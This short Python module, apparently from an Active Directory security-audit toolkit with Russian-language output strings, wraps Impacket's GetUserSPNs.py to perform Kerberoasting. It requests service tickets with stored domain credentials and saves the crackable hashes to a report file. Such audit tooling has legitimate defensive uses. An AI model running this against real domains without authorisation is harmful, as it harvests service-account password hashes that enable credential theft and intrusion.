from config import CONFIG
from utils.runner import run_tool
from pathlib import Path

def parse_kerberoast(out: str):
    spns = out.count("SPN:")
    return {
        "spns_found": spns,
        "summary": f"Найдено SPN: {spns}. Хэши сохранены в reports/kerberoast.hashes"
    }

def run_kerberoasting_check():
    out_dir = Path("reports")
    out_dir.mkdir(exist_ok=True)
    hash_file = out_dir / "kerberoast.hashes"
    
    cmd = [
        "GetUserSPNs.py", f"{CONFIG['domain']}/{CONFIG['username']}:{CONFIG['password']}",
        "-dc-ip", CONFIG['dc_ip'],
        "-request",
        "-outputfile", str(hash_file)
    ]
    
    return run_tool(cmd, "Kerberoasting (GetUserSPNs)", parse_kerberoast)